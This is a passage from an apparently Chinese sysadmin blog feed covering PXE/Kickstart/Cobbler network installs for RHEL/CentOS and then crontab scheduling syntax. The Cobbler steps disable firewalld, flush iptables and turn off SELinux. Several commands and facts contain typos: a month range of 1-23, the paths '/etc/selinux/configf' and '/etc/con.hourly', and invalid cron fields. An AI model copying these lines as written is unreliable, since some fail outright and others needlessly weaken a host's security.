/var/lib/tftpboot/</span><br></pre></td></tr></tbody></table></figure><p>&#x5728;/var/lib/tftpboot/&#x4E0B;&#x6DFB;&#x52A0;grub.cfg&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /var/lib/tftpboot/uefi/grub.cfg&#xFF1A;</span><br><span class="line"><span class="built_in">set</span> timeout=60</span><br><span class="line"><span class="comment"># menuentry &apos;RHEL 7&apos;&#x662F;&#x5F15;&#x5BFC;&#x7684;&#x83DC;&#x5355;&#x540D;&#x79F0;</span></span><br><span class="line">menuentry <span class="string">&apos;RHEL 7&apos;</span> {</span><br><span class="line"><span class="comment"># vmlinuz&#x7684;&#x5B58;&#x653E;&#x76EE;&#x5F55;,&#x5982;&#x679C;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x5728;/var/lib/tftpboot/&#x76EE;&#x5F55;&#x4E0B;&#xFF0C;&#x76F4;&#x63A5;&#x5148;vmlinuz</span></span><br><span class="line">    linuxefi vmlinuz ip=dhcp</span><br><span class="line">    <span class="comment"># &#x955C;&#x50CF;&#x5B89;&#x88C5;&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x653E;&#x76EE;&#x5F55;</span></span><br><span class="line">    inst.repo=ftp://192.168.73.120/pub/</span><br><span class="line">    <span class="comment"># initrd.img&#x6587;&#x4EF6;&#x7684;&#x5B58;&#x653E;&#x53D1;&#x76EE;&#x5F55;</span></span><br><span class="line">    initrdefi initrd.img</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><p>&#x542F;&#x52A8;&#x6240;&#x6709;&#x670D;&#x52A1;systemctl restart xinetd dhcpd</p></blockquote><p>&#x590D;&#x5236;&#x955C;&#x50CF;&#x6587;&#x4EF6;&#x5230;uefi/&#x76EE;&#x5F55;&#x4E0B;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /media/cdrom/images/pxeboot/{vmlinuz,initrd.img} /var/lib/tftpboot/</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x67E5;&#x770B;LInux&#x5904;&#x4E8E;BIOS&#x6A21;&#x5F0F;&#x8FD8;&#x662F;UEFI&#x6A21;&#x5F0F;</strong></p><p>&#x5728;UEFI&#x6A21;&#x5F0F;&#x4E0B;Linux&#x7CFB;&#x7EDF;&#x5728;<code>/sys/firmware/</code>&#x76EE;&#x5F55;&#x4E0B;&#x5B58;&#x5728;<code>efi</code>&#x76EE;&#x5F55;&#xFF0C;BIOS&#x6A21;&#x5F0F;&#x662F;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x7684;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ls -ld /sys/firmware/efi/</span><br><span class="line"></span><br><span class="line"><span class="comment"># BIOS&#x6A21;&#x5F0F;&#x4E0B;grub2&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x4E3A;/etc/grub2.cfg</span></span><br><span class="line"><span class="comment"># EFI&#x6A21;&#x5F0F;&#x4E0B;grub2&#x5F15;&#x5BFC;&#x6587;&#x4EF6;&#x4E3A;/etc/grub2-efi.cfg</span></span><br><span class="line">[root@pxelab tftpboot]<span class="comment"># ls -lrt /etc/grub2.cfg</span></span><br><span class="line">lrwxrwxrwx. 1 root root 22 Jan 22 17:31 /etc/grub2.cfg -&gt; ../boot/grub2/grub.cfg</span><br><span class="line">[root@pxelab ~]<span class="comment"># ls -lrt /etc/grub2-efi.cfg</span></span><br><span class="line">lrwxrwxrwx. 1 root root 31 Jan 24 07:18 /etc/grub2-efi.cfg -&gt; ../boot/efi/EFI/redhat/grub.cfg</span><br></pre></td></tr></tbody></table></figure><p>&#x5982;&#x679C;&#x662F;EFI&#x6A21;&#x5F0F;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x6709;&#x5982;&#x4E0B;&#x76EE;&#x5F55;/&#x6587;&#x4EF6;&#xFF1A;</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@pxelab ~]<span class="comment"># ls -lrt /etc/grub2-efi.cfg</span></span><br><span class="line">lrwxrwxrwx. 1 root root 31 Jan 24 07:18 /etc/grub2-efi.cfg -&gt; ../boot/efi/EFI/redhat/grub.cfg</span><br><span class="line">[root@pxelab ~]<span class="comment"># ls -ld /boot/efi/EFI/</span></span><br><span class="line">drwx------. 4 root root 4096 Jan 24 07:19 /boot/efi/EFI/</span><br><span class="line">[root@pxelab ~]<span class="comment"># ls -lrt /boot/efi/EFI/</span></span><br><span class="line">total 8</span><br><span class="line">drwx------. 2 root root 4096 Jan 24 07:19 BOOTdrwx------. 3 root root 4096 Jan 24 07:21 redhat</span><br><span class="line">[root@pxelab ~]<span class="comment"># ls -lrt /boot/efi/EFI/*</span></span><br><span class="line">/boot/efi/EFI/BOOT:</span><br><span class="line">total 1340</span><br><span class="line">-rwx------. 1 root root   71784 Jul 20  2015 fallback.efi</span><br><span class="line">-rwx------. 1 root root 1295704 Jul 20  2015 BOOTX64.EFI</span><br><span class="line"></span><br><span class="line">/boot/efi/EFI/redhat:</span><br><span class="line">total 5812</span><br><span class="line">-rwx------. 1 root root 1289544 Jul 20  2015 shim-redhat.efi</span><br><span class="line">-rwx------. 1 root root 1295704 Jul 20  2015 shim.efi</span><br><span class="line">-rwx------. 1 root root 1282496 Jul 20  2015 MokManager.efi</span><br><span class="line">-rwx------. 1 root root     176 Jul 20  2015 BOOT.CSV</span><br><span class="line">-rwx------. 1 root root 1024464 Aug 29  2016 grubx64.efi</span><br><span class="line">-rwx------. 1 root root 1024464 Aug 29  2016 gcdx64.efi</span><br><span class="line">drwx------. 2 root root    4096 Jan 24 07:18 fonts</span><br><span class="line">-rwx------. 1 root root    1024 Jan 24 07:21 grubenv</span><br><span class="line">-rwx------. 1 root root    4245 Jan 24 07:21 grub.cfg</span><br><span class="line">[root@pxelab ~]<span class="comment">#</span></span><br></pre></td></tr></tbody></table></figure><h3 id="Kickstart"><a href="#Kickstart" class="headerlink" title="Kickstart"></a>Kickstart</h3><p>&#x751F;&#x6210;kickstart&#x6587;&#x4EF6;<br>&#x4F7F;&#x7528;&#x5728;&#x7EBF;&#x751F;&#x6210;&#x5668;&#xFF08;&#x9700;&#x8981;&#x6CE8;&#x518C;&#x767B;&#x5F55;&#xFF09;<a href="https://access.redhat.com/labs/kickstartconfig/" target="_blank" rel="noopener">https://access.redhat.com/labs/kickstartconfig/</a><br>&#x6216;<br>&#x4F7F;&#x7528;&#x7528;&#x6237;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x9ED8;&#x8BA4;&#x6A21;&#x677F;anaconda-ks.cfg</p><blockquote><p>&#x3010;&#x6CE8;&#x610F;&#xFF01;&#x3011;<br>&#x914D;&#x7F6E;&#x7684;&#x6BCF;&#x90E8;&#x5206;&#x5FC5;&#x987B;&#x6309;&#x987A;&#x5E8F;&#x6307;&#x5B9A;&#xFF0C;&#x6BCF;&#x90E8;&#x5206;&#x5185;&#x4E0D;&#x5FC5;&#x6309;&#x9700;&#x6392;&#x5E8F;<br>%addon&#x3001;%packages&#x3001;%pre&#x3001;%post&#x5FC5;&#x987B;&#x4EE5;%end&#x7ED3;&#x5C3E;</p><p>#&#x6CE8;&#x91CA;</p></blockquote><p>&#x5B89;&#x88C5;kickstart&#x6587;&#x4EF6;&#x9A8C;&#x8BC1;&#x5668;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install pykickstart</span><br></pre></td></tr></tbody></table></figure><p>&#x4F7F;&#x7528;ksvalidator&#x547D;&#x4EE4;&#x9A8C;&#x8BC1;ks&#x6587;&#x4EF6;&#x7684;&#x6B63;&#x786E;&#x6027;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ksvalidator kickstart.ks</span><br></pre></td></tr></tbody></table></figure><p><strong>BIOS</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">append initrd=initrd.img inst.ks=[http/ftp/tftp/nfs]://192.168.73.120/var/lib/tftpboot/ks.cfg</span><br></pre></td></tr></tbody></table></figure><p><strong>UEFI</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel vmlinuz inst.ks=[http/ftp/tftp/nfs]://192.168.73.120/var/tftpboot/ks.cfg</span><br></pre></td></tr></tbody></table></figure><p>kickstart&#x6587;&#x4EF6;&#x8BED;&#x6CD5;&#x53D8;&#x5316;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ksverdiff -f RHEL6 -t RHEL7</span><br><span class="line"><span class="comment"># -f&#x6307;&#x5B9A;&#x6BD4;&#x8F83;&#x7B2C;&#x4E00;&#x4E2A;&#x53D1;&#x884C;&#x7248;&#xFF0C;-t&#x6307;&#x5B9A;&#x6BD4;&#x8F83;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x53D1;&#x884C;&#x7248;</span></span><br></pre></td></tr></tbody></table></figure><p>&#x4F7F;&#x7528;SSL&#x534F;&#x8BAE;&#x65F6;&#xFF0C;&#x7981;&#x7528;SSLv2&#x548C;SSLv3&#xFF0C;&#x8BE5;&#x9009;&#x9879;&#x89E6;&#x53D1;CVE-2014-3566&#x6F0F;&#x6D1E;</p><h3 id="Cobbler-Kickstart"><a href="#Cobbler-Kickstart" class="headerlink" title="Cobbler+Kickstart"></a>Cobbler+Kickstart</h3><p>&#x5173;&#x95ED;SELinux&#x548C;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x91CD;&#x542F;Linux</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld</span><br><span class="line">iptables -F</span><br><span class="line">setenforce 0</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&apos;s/SELINUX=enforcing/SELINUX=disabled/g&apos;</span> /etc/selinux/configf</span><br></pre></td></tr></tbody></table></figure><p>&#x66F4;&#x65B0;yum&#x6E90;&#x548C;epel&#x6E90;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x6E90;</span></span><br><span class="line">yum install -y epel-release</span><br></pre></td></tr></tbody></table></figure><p>&#x5B89;&#x88C5;&#x5176;&#x4ED6;&#x670D;&#x52A1;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y dhcp pykickstart httpd dhcp rsync tftp-server xinetd syslinux</span><br></pre></td></tr></tbody></table></figure><p>&#x5B89;&#x88C5;Cobbler</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install cobbler cobbler-web</span><br></pre></td></tr></tbody></table></figure><p>&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><blockquote><p>vim /etc/cobbler/settings</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x95EE;&#x9898; 1&#xFF1A;&#x4FEE;&#x6539; server &#x5730;&#x5740;&#x4E3A; 192.168.1.7</span><br><span class="line">&#x6539;&#xFF1A;390 server: 127.0.1</span><br><span class="line">&#x4E3A;&#xFF1A;390 server: 192.168.1.7</span><br><span class="line">&#x95EE;&#x9898; 2&#xFF1A;&#x4FEE;&#x6539; next_server &#x5730;&#x5740;&#x4E3A; 192.168.1.7</span><br><span class="line">&#x6539;&#xFF1A;278 next_server: 127.0.1</span><br><span class="line">&#x4E3A;&#xFF1A;278 next_server: 192.168.1.7</span><br><span class="line">&#x6539;&#xFF1A;242 manage_dhcp: 0</span><br><span class="line">&#x4E3A;&#xFF1A;242 manage_dhcp: 1</span><br></pre></td></tr></tbody></table></figure><blockquote><p>vim /etc/cobbler/dhcp.template</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x6539;&#xFF1A;22 option routers 192.168.1.5; <span class="comment">#&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#x5730;&#x5740;</span></span><br><span class="line">&#x4E3A;&#xFF1A;22 option routers 192.168.1.1; <span class="comment">#&#x4EE5;&#x5B9E;&#x9645;&#x7684;&#x7F51;&#x5173;&#x4E3A;&#x51C6;</span></span><br><span class="line">&#x6539;&#xFF1A;23 option domain-name-servers 192.168.1.1; <span class="comment">#&#x4FEE;&#x6539; DNS &#x5730;&#x5740;</span></span><br><span class="line">&#x4E3A;&#xFF1A;23 option domain-name-servers 114.114.114.114;</span><br><span class="line">&#x5982;&#x4E0B;&#xFF1A;</span><br><span class="line"></span><br><span class="line"> 21 subnet 192.168.1.0 netmask 255.255.255.0 {</span><br><span class="line"> 22      option routers             192.168.1.1;</span><br><span class="line"> 23      option domain-name-servers 114.114.114.114;</span><br><span class="line"> 24      option subnet-mask         255.255.255.0;</span><br><span class="line"> 25      range dynamic-bootp        192.168.1.100 192.168.1.254;</span><br><span class="line"> 26      default-lease-time         21600;</span><br><span class="line"> 27      max-lease-time             43200;</span><br><span class="line"> 28      next-server                <span class="variable">$next_server</span>;</span><br></pre></td></tr></tbody></table></figure><p>&#x542F;&#x52A8;&#x670D;&#x52A1;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd cobblerd</span><br><span class="line">cobbler sync</span><br><span class="line">systemctl <span class="built_in">enable</span> httpd cobblerd</span><br></pre></td></tr></tbody></table></figure><p>&#x68C0;&#x67E5;cobbler&#x662F;&#x5426;&#x5B58;&#x5728;&#x9519;&#x8BEF;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cobbler check</span><br><span class="line">systemctl restart cobblerd</span><br><span class="line">cobbler sync</span><br></pre></td></tr></tbody></table></figure><p>&#x6302;&#x8F7D;&#x5149;&#x9A71;&#x5BFC;&#x5165;&#x955C;&#x50CF;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/cdrom /mnt</span><br><span class="line">cobbler import --path=/mnt/ --name=CentOS7.6 --arch=x86_64</span><br></pre></td></tr></tbody></table></figure><p>&#x67E5;&#x770B;cobbler&#x955C;&#x50CF;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cobbler list</span><br></pre></td></tr></tbody></table></figure><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="PXE-Server"><a href="#PXE-Server" class="headerlink" title="PXE Server"></a>PXE Server</h3><h3 id="&#x4FEE;&#x6539;Windows&#x955C;&#x50CF;"><a href="#&#x4FEE;&#x6539;Windows&#x955C;&#x50CF;" class="headerlink" title="&#x4FEE;&#x6539;Windows&#x955C;&#x50CF;"></a>&#x4FEE;&#x6539;Windows&#x955C;&#x50CF;</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Linux&quot;&gt;&lt;a href=&quot;#Linux&quot; class=&quot;headerlink&quot; title=&quot;Linux&quot;&gt;&lt;/a&gt;Linux&lt;/h2&gt;&lt;h3 id=&quot;PXE-Kickstart&quot;&gt;&lt;a href=&quot;#PXE-Kickstart&quot; class=&quot;header
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux计划任务实现</title>
    <link href="https://marnm.github.io//posts/2fe5fc07/"/>
    <id>https://marnm.github.io//posts/2fe5fc07/</id>
    <published>2022-06-07T04:37:20.000Z</published>
    <updated>2022-06-07T05:23:08.695Z</updated>
    
    <content type="html"><![CDATA[<h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><blockquote><p>&#x63D0;&#x4EA4;&#x548C;&#x7BA1;&#x7406;&#x7528;&#x6237;&#x7684;&#x9700;&#x8981;&#x5468;&#x671F;&#x6027;&#x6267;&#x884C;&#x7684;&#x4EFB;&#x52A1;</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crontab&#x4EFB;&#x52A1;&#x683C;&#x5F0F;</span></span><br><span class="line">minute hour day month week <span class="built_in">command</span> &#x987A;&#x5E8F;&#xFF1A;&#x5206; &#x65F6; &#x65E5; &#x6708; &#x5468;</span><br></pre></td></tr></tbody></table></figure><p>&#x8BF4;&#x660E;&#xFF1A;</p><ul><li>minute: &#x8868;&#x793A;&#x5206;&#x949F;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x4ECE;0&#x5230;59&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;</li><li>hour: &#x8868;&#x793A;&#x5C0F;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x4ECE;0&#x5230;23&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;</li><li>day: &#x8868;&#x793A;&#x65E5;&#x671F;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;1-31&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;</li><li>month: &#x8868;&#x793A;&#x6708;&#x4EFD;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;1-23&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x82F1;&#x6587;</li><li>week: &#x8868;&#x793A;&#x661F;&#x671F;&#x51E0;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;0-7&#x4E4B;&#x95F4;&#x7684;&#x4EFB;&#x4F55;&#x6574;&#x6570;&#xFF0C;&#xFF08;0&#x548C;7&#x4EE3;&#x8868;&#x661F;&#x671F;&#x65E5;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x82F1;&#x6587;</li><li>command: &#x8981;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x81EA;&#x5DF1;&#x7F16;&#x5199;&#x7684;&#x811A;&#x672C;</li></ul><hr><ul><li>&#x661F;&#x53F7;(*) : &#x4EE3;&#x8868;&#x6240;&#x6709;&#x53EF;&#x80FD;&#x7684;&#x503C;&#xFF0C;&#x4F8B;&#x5982;month&#x5B57;&#x6BB5;&#x5982;&#x679C;&#x662F;&#x661F;&#x53F7;&#xFF0C;&#x5219;&#x8868;&#x793A;&#x5728;&#x6EE1;&#x8DB3;&#x5176;&#x4ED6;&#x5B57;&#x6BB5;&#x7684;&#x5236;&#x7EA6;&#x6761;&#x4EF6;&#x540E;&#x6BCF;&#x6708;&#x90FD;&#x6267;&#x884C;&#x8BE5;&#x547D;&#x4EE4;&#x7684;&#x64CD;&#x4F5C;</li><li>&#x9017;&#x53F7;(,)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;&#x7684;&#x503C;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5217;&#x8868;&#x8303;&#x56F4;&#xFF0C;&#x4F8B;&#x5982;1,2,4,7,9</li><li>&#x4E2D;&#x6760;(-)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x6574;&#x6570;&#x4E4B;&#x95F4;&#x7684;&#x4E2D;&#x6760;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x8303;&#x56F4;&#xFF0C;&#x4F8B;&#x5982;2-6&#x8868;&#x793A;2,3,4,5,6</li><li>&#x6B63;&#x659C;&#x7EBF;(/)&#xFF1A;&#x53EF;&#x4EE5;&#x7528;&#x6B63;&#x659C;&#x7EBF;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x7684;&#x95F4;&#x9694;&#x9891;&#x7387;&#xFF0C;&#x4F8B;&#x5982;0-23/2&#x8868;&#x793A;&#x6BCF;&#x4E24;&#x4E2A;&#x5C0F;&#x65F6;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;&#x901A;&#x77E5;&#x6B63;&#x659C;&#x7EBF;&#x53EF;&#x4EE5;&#x548C;&#x661F;&#x53F7;&#x4E00;&#x8D77;&#x4F7F;&#x7528;&#xFF0C;&#x4F8B;&#x5982;*/10&#xFF0C;&#x5728;minute&#x5B57;&#x6BB5;&#x8868;&#x793A;&#x6BCF;&#x5341;&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x6BCF;&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;</span></span><br><span class="line">* * * * * <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x5C0F;&#x65F6;&#x7684;&#x7B2C;&#x4E09;&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;</span></span><br><span class="line">3,15 * * * * <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5728;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;</span></span><br><span class="line">3,15 8-11 * * * <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x9694;&#x4E24;&#x5929;&#x7684;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;</span></span><br><span class="line">3,15 8-11 */2 * * <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x4E2A;&#x661F;&#x671F;&#x4E00;&#x7684;&#x4E0A;&#x5348;8&#x70B9;&#x5230;11&#x70B9;&#x7684;&#x7B2C;3&#x548C;&#x7B2C;15&#x5206;&#x949F;&#x6267;&#x884C;</span></span><br><span class="line">3,15 8-11 * * 1 <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x665A;21:30&#x91CD;&#x542F;smb</span></span><br><span class="line">30 21 * * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x6708;1&#x3001;10&#x3001;22&#x65E5;&#x7684;4:45&#x91CD;&#x542F;smb</span></span><br><span class="line">45 4 1,10,22 * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x5468;&#x516D;&#xFF0C;&#x5468;&#x65E5;&#x7684;1:10&#x91CD;&#x542F;smb</span></span><br><span class="line">10 1 * * 6,7(&#x6216;&#x8005;6,0) /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x5929;18:00&#x81F3;23:00&#x4E4B;&#x95F4;&#x6BCF;&#x9694;30&#x5206;&#x949F;&#x91CD;&#x542F;smb</span></span><br><span class="line">*/30(0,30) 18-23 * * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x5468;&#x516D;&#x7684;&#x665A;&#x4E0A;11&#x91CD;&#x542F;smb</span></span><br><span class="line">0 23 * * 6 /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x5C0F;&#x65F6;&#x91CD;&#x542F;smb</span></span><br><span class="line">* */1 * * * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x6708;4&#x53F7;&#x4E0E;&#x6BCF;&#x5468;&#x4E00;&#x5230;&#x5468;&#x4E09;&#x7684;11&#x70B9;&#x91CD;&#x542F;smb</span></span><br><span class="line">0 11 4 * 1-3(mon-wed) /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x4E00;&#x6708;&#x4E00;&#x53F7;&#x7684;4&#x70B9;&#x91CD;&#x542F;smb</span></span><br><span class="line">0 4 1 jan * /etc/init.d/smb restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6BCF;&#x5C0F;&#x65F6;&#x6267;&#x884C;/etc/cron.hourly&#x76EE;&#x5F55;&#x5185;&#x7684;&#x811A;&#x672C;</span></span><br><span class="line">01 * * * * root run-parts /etc/con.hourly</span><br></pre></td></tr></tbody></table></figure><h3 id="at"><a href="#at" class="headerlink" title="at"></a>at</h3><blockquote><p>&#x5728;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x4EFB;&#x52A1;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 